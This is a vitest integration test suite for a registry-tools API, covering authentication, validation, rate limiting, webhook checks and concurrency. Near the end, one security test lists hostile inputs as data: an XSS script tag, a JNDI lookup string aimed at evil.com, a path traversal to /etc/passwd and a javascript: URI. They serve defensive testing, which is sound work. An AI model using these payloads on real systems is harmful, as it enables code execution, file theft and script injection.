/**
 * Comprehensive Integration Tests for Registry Tools API Endpoints
 *
 * This test suite provides thorough coverage for the Registry Tools API including:
 * - CRUD operations (GET, POST) for dynamic tool registration
 * - Authentication and authorization testing
 * - Input validation and error handling
 * - Webhook validation and security testing
 * - Rate limiting functionality
 * - Performance and edge case scenarios
 *
 * Dependencies: vitest, bun-compatible test infrastructure
 * Test Infrastructure: Uses enhanced-utils for consistent mock patterns
 *
 * Coverage Goals:
 * - All HTTP methods and status codes
 * - All validation schemas and error paths
 * - Database operations and transactions
 * - External webhook validation
 * - Rate limiting scenarios
 * - Security edge cases and malicious inputs
 */

import { NextRequest } from 'next/server'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// Import the new bun-compatible test infrastructure
import '@/app/api/__test-utils__/module-mocks'
import {
  createEnhancedMockRequest,
  setupEnhancedTestMocks,
} from '@/app/api/__test-utils__/enhanced-utils'
import { mockControls, mockUser } from '@/app/api/__test-utils__/module-mocks'
// Import the API endpoints under test
import { GET, POST } from './route'

/**
 * Sample tool test data with comprehensive logging for debugging
 * Covers all possible tool configuration scenarios
 */
const sampleToolManifest = {
  configSchema: {
    type: 'object' as const,
    properties: {
      apiKey: {
        type: 'string',
        description: 'API key for authentication',
      },
      baseUrl: {
        type: 'string',
        format: 'uri',
        description: 'Base URL for API calls',
      },
      timeout: {
        type: 'number',
        minimum: 1000,
        maximum: 30000,
        description: 'Request timeout in milliseconds',
      },
    },
    required: ['apiKey'],
  },
  inputSchema: {
    type: 'object' as const,
    properties: {
      query: {
        type: 'string',
        description: 'Search query',
      },
      limit: {
        type: 'number',
        minimum: 1,
        maximum: 100,
        description: 'Maximum number of results',
      },
    },
  },
  outputSchema: {
    type: 'object' as const,
    properties: {
      results: {
        type: 'array',
        items: {
          type: 'object',
          properties: {
            id: { type: 'string' },
            title: { type: 'string' },
            url: { type: 'string' },
          },
        },
      },
      totalCount: {
        type: 'number',
        description: 'Total number of available results',
      },
    },
  },
}

const sampleToolData = {
  name: 'custom_search_tool',
  displayName: 'Custom Search Tool',
  description: 'A custom search tool for external API integration',
  icon: 'search-icon',
  category: 'search',
  version: '1.0.0',
  manifest: sampleToolManifest,
  webhookUrl: 'https://api.example.com/webhook/search',
  webhookMethod: 'POST' as const,
  webhookTimeout: 30000,
  webhookRetryCount: 3,
  authentication: {
    type: 'api_key' as const,
    tokenValidationUrl: 'https://api.example.com/validate',
    requirements: {
      header: 'X-API-Key',
      format: 'Bearer {token}',
    },
  },
  tags: ['search', 'external-api', 'productivity'],
  metadata: {
    author: 'Test Developer',
    documentation: 'https://docs.example.com/tool',
    supportUrl: 'https://support.example.com',
  },
}

const registeredToolResponse = {
  id: 'tool_1234567890abcdef',
  userId: mockUser.id,
  name: sampleToolData.name,
  displayName: sampleToolData.displayName,
  description: sampleToolData.description,
  icon: sampleToolData.icon,
  category: sampleToolData.category,
  version: sampleToolData.version,
  status: 'active',
  manifest: sampleToolManifest,
  configSchema: sampleToolManifest.configSchema,
  inputSchema: sampleToolManifest.inputSchema,
  outputSchema: sampleToolManifest.outputSchema,
  webhookUrl: sampleToolData.webhookUrl,
  webhookMethod: sampleToolData.webhookMethod,
  webhookTimeout: sampleToolData.webhookTimeout,
  webhookRetryCount: sampleToolData.webhookRetryCount,
  authentication: sampleToolData.authentication,
  usageCount: 0,
  lastUsedAt: null,
  errorCount: 0,
  lastErrorAt: null,
  lastErrorMessage: null,
  tags: sampleToolData.tags,
  metadata: sampleToolData.metadata,
  createdAt: new Date('2024-01-01T00:00:00.000Z'),
  updatedAt: new Date('2024-01-01T00:00:00.000Z'),
}

const sampleToolsList = [
  registeredToolResponse,
  {
    ...registeredToolResponse,
    id: 'tool_fedcba0987654321',
    name: 'analytics_tool',
    displayName: 'Analytics Tool',
    description: 'Custom analytics and reporting tool',
    category: 'analytics',
    usageCount: 15,
    lastUsedAt: new Date('2024-01-15T10:30:00.000Z'),
    tags: ['analytics', 'reporting'],
  },
]

/**
 * Mock fetch function for webhook validation testing
 */
function mockFetchWithResponse(status = 200, ok = true) {
  global.fetch = vi.fn().mockResolvedValue({
    ok,
    status,
    headers: new Headers(),
    json: () => Promise.resolve({}),
  })
}

describe('Registry Tools API - GET /api/registry/tools', () => {
  let mocks: any

  beforeEach(() => {
    console.log('🧪 Setting up Registry Tools GET tests with enhanced infrastructure')

    // Reset all mocks to clean state
    mockControls.reset()
    vi.clearAllMocks()

    // Setup enhanced test environment with bun compatibility
    mocks = setupEnhancedTestMocks({
      auth: { authenticated: true, user: mockUser },
      database: {
        select: { results: [sampleToolsList, [{ count: 2 }]] },
      },
      permissions: { level: 'admin' },
    })

    console.log('✅ Registry Tools GET test setup complete')
  })

  describe('Authentication and Authorization', () => {
    it('should return 401 when user is not authenticated', async () => {
      console.log('🧪 Testing unauthenticated access to GET /api/registry/tools')

      // Setup unauthenticated user
      mocks.auth.setUnauthenticated()

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(401)
      const data = await response.json()
      expect(data.error.code).toBe('UNAUTHORIZED')
      expect(data.error.message).toBe('Authentication required')

      console.log('✅ Unauthenticated access properly rejected')
    })

    it('should authenticate with valid session', async () => {
      console.log('🧪 Testing authenticated access to GET /api/registry/tools')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.tools).toBeDefined()
      expect(data.pagination).toBeDefined()

      console.log('✅ Authenticated access successful')
    })
  })

  describe('Tool Listing and Filtering', () => {
    it('should list tools with default parameters', async () => {
      console.log('🧪 Testing tool listing with default parameters')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.tools).toEqual(sampleToolsList)
      expect(data.pagination.total).toBe(2)
      expect(data.pagination.page).toBe(1)
      expect(data.pagination.limit).toBe(20)

      console.log('✅ Default tool listing successful')
    })

    it('should filter tools by category', async () => {
      console.log('🧪 Testing category filtering')

      const request = new NextRequest('http://localhost:3000/api/registry/tools?category=search')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.tools).toBeDefined()

      console.log('✅ Category filtering successful')
    })

    it('should filter tools by status', async () => {
      console.log('🧪 Testing status filtering')

      const request = new NextRequest('http://localhost:3000/api/registry/tools?status=active')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.tools).toBeDefined()

      console.log('✅ Status filtering successful')
    })

    it('should search tools by name and description', async () => {
      console.log('🧪 Testing text search functionality')

      const request = new NextRequest(
        'http://localhost:3000/api/registry/tools?search=custom%20search'
      )
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.tools).toBeDefined()

      console.log('✅ Text search successful')
    })

    it('should handle pagination correctly', async () => {
      console.log('🧪 Testing pagination functionality')

      const request = new NextRequest('http://localhost:3000/api/registry/tools?page=1&limit=10')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.pagination.page).toBe(1)
      expect(data.pagination.limit).toBe(10)
      expect(data.pagination.totalPages).toBe(1)
      expect(data.pagination.hasNext).toBe(false)
      expect(data.pagination.hasPrev).toBe(false)

      console.log('✅ Pagination functionality successful')
    })
  })

  describe('Input Validation and Error Handling', () => {
    it('should validate query parameters', async () => {
      console.log('🧪 Testing query parameter validation')

      const request = new NextRequest(
        'http://localhost:3000/api/registry/tools?page=invalid&limit=abc'
      )
      const response = await GET(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')
      expect(data.error.message).toBe('Invalid query parameters')
      expect(data.error.details).toBeDefined()

      console.log('✅ Query parameter validation successful')
    })

    it('should validate pagination limits', async () => {
      console.log('🧪 Testing pagination limit validation')

      const request = new NextRequest('http://localhost:3000/api/registry/tools?limit=150')
      const response = await GET(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')

      console.log('✅ Pagination limit validation successful')
    })

    it('should handle database errors gracefully', async () => {
      console.log('🧪 Testing database error handling')

      // Setup database error
      mockControls.setDatabaseResults([])
      const originalSelect = mocks.database.mockDb.select
      mocks.database.mockDb.select = vi.fn(() => {
        throw new Error('Database connection failed')
      })

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Database error handled gracefully')
    })
  })

  describe('Response Format and Structure', () => {
    it('should return properly structured response', async () => {
      console.log('🧪 Testing response structure validation')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify response structure
      expect(data).toHaveProperty('tools')
      expect(data).toHaveProperty('pagination')
      expect(Array.isArray(data.tools)).toBe(true)

      // Verify pagination structure
      expect(data.pagination).toHaveProperty('page')
      expect(data.pagination).toHaveProperty('limit')
      expect(data.pagination).toHaveProperty('total')
      expect(data.pagination).toHaveProperty('totalPages')
      expect(data.pagination).toHaveProperty('hasNext')
      expect(data.pagination).toHaveProperty('hasPrev')

      console.log('✅ Response structure validation successful')
    })

    it('should include all necessary tool fields', async () => {
      console.log('🧪 Testing tool field completeness')

      const request = createEnhancedMockRequest('GET')
      const response = await GET(request)

      expect(response.status).toBe(200)
      const data = await response.json()

      if (data.tools.length > 0) {
        const tool = data.tools[0]

        // Verify essential tool fields
        expect(tool).toHaveProperty('id')
        expect(tool).toHaveProperty('name')
        expect(tool).toHaveProperty('displayName')
        expect(tool).toHaveProperty('status')
        expect(tool).toHaveProperty('usageCount')
        expect(tool).toHaveProperty('errorCount')
        expect(tool).toHaveProperty('tags')
        expect(tool).toHaveProperty('createdAt')
        expect(tool).toHaveProperty('updatedAt')
      }

      console.log('✅ Tool field completeness verified')
    })
  })
})

describe('Registry Tools API - POST /api/registry/tools', () => {
  let mocks: any

  beforeEach(() => {
    console.log('🧪 Setting up Registry Tools POST tests with enhanced infrastructure')

    // Reset all mocks to clean state
    mockControls.reset()
    vi.clearAllMocks()

    // Setup successful webhook validation
    mockFetchWithResponse(200, true)

    mocks = setupEnhancedTestMocks({
      auth: { authenticated: true, user: mockUser },
      database: {
        select: { results: [[], [registeredToolResponse]] }, // Empty for duplicate check, then insert result
        insert: { results: [registeredToolResponse] },
        update: { results: [] }, // For rate limit update
      },
      permissions: { level: 'admin' },
    })

    // Setup enhanced database results
    mockControls.setDatabaseResults([
      [], // Duplicate check - no existing tools
      [registeredToolResponse], // Insert result
      [], // Rate limit update result
    ])

    console.log('✅ Registry Tools POST test setup complete')
  })

  describe('Tool Registration Success Cases', () => {
    it('should register a new tool successfully with all fields', async () => {
      console.log('🧪 Testing successful tool registration with complete data')

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.id).toBeDefined()
      expect(data.name).toBe(sampleToolData.name)
      expect(data.displayName).toBe(sampleToolData.displayName)
      expect(data.status).toBe('active')
      expect(data.createdAt).toBeDefined()
      expect(data.webhookUrl).toBe(sampleToolData.webhookUrl)

      console.log('✅ Tool registration successful')
    })

    it('should register tool with minimal required data', async () => {
      console.log('🧪 Testing minimal tool registration')

      const minimalToolData = {
        name: 'minimal_tool',
        displayName: 'Minimal Tool',
        manifest: {
          configSchema: {
            type: 'object' as const,
            properties: {},
          },
        },
        webhookUrl: 'https://api.example.com/minimal',
      }

      const request = createEnhancedMockRequest('POST', minimalToolData)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.name).toBe(minimalToolData.name)
      expect(data.displayName).toBe(minimalToolData.displayName)

      console.log('✅ Minimal tool registration successful')
    })

    it('should handle optional fields with defaults', async () => {
      console.log('🧪 Testing default value handling for optional fields')

      const toolDataWithDefaults = {
        name: 'defaults_tool',
        displayName: 'Tool With Defaults',
        manifest: {
          configSchema: {
            type: 'object' as const,
            properties: {},
          },
        },
        webhookUrl: 'https://api.example.com/defaults',
        // Omitting optional fields to test defaults
      }

      const request = createEnhancedMockRequest('POST', toolDataWithDefaults)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.id).toBeDefined()
      expect(data.status).toBe('active')

      console.log('✅ Default value handling successful')
    })
  })

  describe('Authentication and Authorization', () => {
    it('should require authentication for tool registration', async () => {
      console.log('🧪 Testing authentication requirement for tool registration')

      mocks.auth.setUnauthenticated()

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(401)
      const data = await response.json()
      expect(data.error.code).toBe('UNAUTHORIZED')
      expect(data.error.message).toBe('Authentication required')

      console.log('✅ Authentication requirement enforced')
    })
  })

  describe('Input Validation', () => {
    it('should validate required name field', async () => {
      console.log('🧪 Testing required name field validation')

      const invalidToolData = {
        ...sampleToolData,
        name: '',
      }

      const request = createEnhancedMockRequest('POST', invalidToolData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')
      expect(data.error.message).toBe('Invalid tool data')

      console.log('✅ Required name field validation successful')
    })

    it('should validate name format restrictions', async () => {
      console.log('🧪 Testing name format validation')

      const invalidNames = [
        'Invalid Name', // spaces not allowed
        'invalid-name', // hyphens not allowed
        'INVALID_NAME', // uppercase not allowed
        '123invalid', // cannot start with number
        'invalid.name', // dots not allowed
      ]

      for (const invalidName of invalidNames) {
        const invalidToolData = {
          ...sampleToolData,
          name: invalidName,
        }

        const request = createEnhancedMockRequest('POST', invalidToolData)
        const response = await POST(request)

        expect(response.status).toBe(400)
        const data = await response.json()
        expect(data.error.code).toBe('VALIDATION_ERROR')
      }

      console.log('✅ Name format validation successful')
    })

    it('should validate display name requirements', async () => {
      console.log('🧪 Testing display name validation')

      const invalidToolData = {
        ...sampleToolData,
        displayName: '',
      }

      const request = createEnhancedMockRequest('POST', invalidToolData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')

      console.log('✅ Display name validation successful')
    })

    it('should validate webhook URL format', async () => {
      console.log('🧪 Testing webhook URL validation')

      const invalidUrls = [
        'not-a-url',
        'ftp://example.com', // Only HTTP/HTTPS allowed
        'http://localhost', // May not be accessible
        '',
      ]

      for (const invalidUrl of invalidUrls) {
        const invalidToolData = {
          ...sampleToolData,
          webhookUrl: invalidUrl,
        }

        const request = createEnhancedMockRequest('POST', invalidToolData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Webhook URL format validation successful')
    })

    it('should validate manifest structure', async () => {
      console.log('🧪 Testing manifest structure validation')

      const invalidManifests = [
        // Missing configSchema
        {
          inputSchema: { type: 'object' as const, properties: {} },
        },
        // Invalid configSchema type
        {
          configSchema: { type: 'string' as const },
        },
        // Invalid structure
        null,
        'invalid-manifest',
      ]

      for (const invalidManifest of invalidManifests) {
        const invalidToolData = {
          ...sampleToolData,
          manifest: invalidManifest as any,
        }

        const request = createEnhancedMockRequest('POST', invalidToolData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Manifest structure validation successful')
    })

    it('should validate version format', async () => {
      console.log('🧪 Testing version format validation')

      const invalidVersions = [
        '1.0', // Must be semantic version
        'v1.0.0', // No 'v' prefix
        '1.0.0.0', // Too many parts
        'latest', // Must be numeric
      ]

      for (const invalidVersion of invalidVersions) {
        const invalidToolData = {
          ...sampleToolData,
          version: invalidVersion,
        }

        const request = createEnhancedMockRequest('POST', invalidToolData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Version format validation successful')
    })

    it('should validate timeout ranges', async () => {
      console.log('🧪 Testing timeout validation')

      const invalidTimeouts = [
        500, // Too low (minimum 1000ms)
        400000, // Too high (maximum 300000ms)
        -1000, // Negative values
      ]

      for (const invalidTimeout of invalidTimeouts) {
        const invalidToolData = {
          ...sampleToolData,
          webhookTimeout: invalidTimeout,
        }

        const request = createEnhancedMockRequest('POST', invalidToolData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Timeout validation successful')
    })
  })

  describe('Business Logic Validation', () => {
    it('should prevent duplicate tool names for same user', async () => {
      console.log('🧪 Testing duplicate name prevention')

      // Setup existing tool with same name
      mockControls.setDatabaseResults([
        [{ id: 'existing-tool-id' }], // Duplicate check - found existing
      ])

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(409)
      const data = await response.json()
      expect(data.error.code).toBe('DUPLICATE_NAME')
      expect(data.error.message).toContain(sampleToolData.name)

      console.log('✅ Duplicate name prevention successful')
    })

    it('should validate webhook URL accessibility', async () => {
      console.log('🧪 Testing webhook URL accessibility validation')

      // Mock failed webhook validation
      mockFetchWithResponse(404, false)

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('WEBHOOK_VALIDATION_FAILED')
      expect(data.error.message).toBe('Webhook URL is not accessible or invalid')

      console.log('✅ Webhook URL accessibility validation successful')
    })
  })

  describe('Rate Limiting', () => {
    it('should enforce rate limiting for tool registrations', async () => {
      console.log('🧪 Testing rate limiting enforcement')

      // Setup rate limit exceeded scenario
      mockControls.setDatabaseResults([
        [
          {
            userId: mockUser.id,
            toolRegistrations: 25, // Over the limit of 20
            windowStart: new Date(),
            lastRequestAt: new Date(),
            isRateLimited: false,
          },
        ], // Rate limit check
      ])

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(429)
      const data = await response.json()
      expect(data.error.code).toBe('RATE_LIMIT_EXCEEDED')
      expect(data.error.message).toContain('rate limit exceeded')

      console.log('✅ Rate limiting enforcement successful')
    })

    it('should reset rate limit window after expiry', async () => {
      console.log('🧪 Testing rate limit window reset')

      // Setup expired rate limit window (older than 60 minutes)
      const oldDate = new Date(Date.now() - 61 * 60 * 1000) // 61 minutes ago
      mockControls.setDatabaseResults([
        [
          {
            userId: mockUser.id,
            toolRegistrations: 25,
            windowStart: oldDate,
            lastRequestAt: oldDate,
            isRateLimited: true,
          },
        ], // Rate limit check - expired window
        [], // Duplicate check
        [registeredToolResponse], // Insert result
        [], // Rate limit update
      ])

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(201)
      const data = await response.json()
      expect(data.id).toBeDefined()

      console.log('✅ Rate limit window reset successful')
    })
  })

  describe('Error Handling and Edge Cases', () => {
    it('should handle malformed JSON gracefully', async () => {
      console.log('🧪 Testing malformed JSON handling')

      const request = new NextRequest('http://localhost:3000/api/registry/tools', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid-json-content',
      })

      const response = await POST(request)

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Malformed JSON handled gracefully')
    })

    it('should handle database insertion errors', async () => {
      console.log('🧪 Testing database insertion error handling')

      // Setup database error
      mockControls.setDatabaseResults([
        [], // Duplicate check - none found
        [], // Insert fails with empty result
      ])

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Database insertion error handled gracefully')
    })

    it('should handle network errors during webhook validation', async () => {
      console.log('🧪 Testing network error handling during webhook validation')

      // Mock network error
      global.fetch = vi.fn().mockRejectedValue(new Error('Network error'))

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('WEBHOOK_VALIDATION_FAILED')

      console.log('✅ Network error handling successful')
    })

    it('should handle webhook validation timeout', async () => {
      console.log('🧪 Testing webhook validation timeout')

      // Mock timeout error
      global.fetch = vi.fn().mockRejectedValue(new Error('The operation was aborted'))

      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('WEBHOOK_VALIDATION_FAILED')

      console.log('✅ Webhook validation timeout handled')
    })
  })

  describe('Security and Authentication Edge Cases', () => {
    it('should validate authentication configuration', async () => {
      console.log('🧪 Testing authentication configuration validation')

      const invalidAuthConfigs = [
        {
          type: 'invalid_type' as any,
        },
        {
          type: 'oauth' as const,
          tokenValidationUrl: 'invalid-url',
        },
      ]

      for (const invalidAuth of invalidAuthConfigs) {
        const invalidToolData = {
          ...sampleToolData,
          authentication: invalidAuth,
        }

        const request = createEnhancedMockRequest('POST', invalidToolData)
        const response = await POST(request)

        expect(response.status).toBe(400)
      }

      console.log('✅ Authentication configuration validation successful')
    })

    it('should handle extremely long inputs gracefully', async () => {
      console.log('🧪 Testing handling of extremely long inputs')

      const longString = 'a'.repeat(10000)
      const invalidToolData = {
        ...sampleToolData,
        description: longString,
      }

      const request = createEnhancedMockRequest('POST', invalidToolData)
      const response = await POST(request)

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VALIDATION_ERROR')

      console.log('✅ Long input handling successful')
    })

    it('should handle special characters and potential XSS attempts', async () => {
      console.log('🧪 Testing special character and XSS handling')

      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '$' + '{jndi:ldap://evil.com}', // Intentional security test string
        '../../../etc/passwd',
        'javascript:alert(1)',
      ]

      for (const maliciousInput of maliciousInputs) {
        const invalidToolData = {
          ...sampleToolData,
          name: 'test_tool',
          displayName: maliciousInput,
        }

        const request = createEnhancedMockRequest('POST', invalidToolData)
        const response = await POST(request)

        // Should either reject (400) or sanitize the input
        expect([200, 201, 400]).toContain(response.status)
      }

      console.log('✅ Special character and XSS handling successful')
    })
  })

  describe('Performance and Concurrency', () => {
    it('should handle concurrent tool registrations', async () => {
      console.log('🧪 Testing concurrent tool registration handling')

      // Setup multiple unique tools
      const concurrentRequests = Array.from({ length: 5 }, (_, i) => {
        const uniqueToolData = {
          ...sampleToolData,
          name: `concurrent_tool_${i}`,
          displayName: `Concurrent Tool ${i}`,
        }
        return createEnhancedMockRequest('POST', uniqueToolData)
      })

      // Process requests concurrently
      const responses = await Promise.all(concurrentRequests.map((request) => POST(request)))

      // At least some should succeed (depending on rate limiting)
      const successfulResponses = responses.filter((r) => r.status === 201)
      expect(successfulResponses.length).toBeGreaterThan(0)

      console.log('✅ Concurrent tool registration handling successful')
    })

    it('should complete registration within reasonable time', async () => {
      console.log('🧪 Testing registration performance')

      const startTime = Date.now()
      const request = createEnhancedMockRequest('POST', sampleToolData)
      const response = await POST(request)
      const endTime = Date.now()

      expect(response.status).toBe(201)
      expect(endTime - startTime).toBeLessThan(5000) // Should complete within 5 seconds

      console.log('✅ Registration performance acceptable')
    })
  })
})
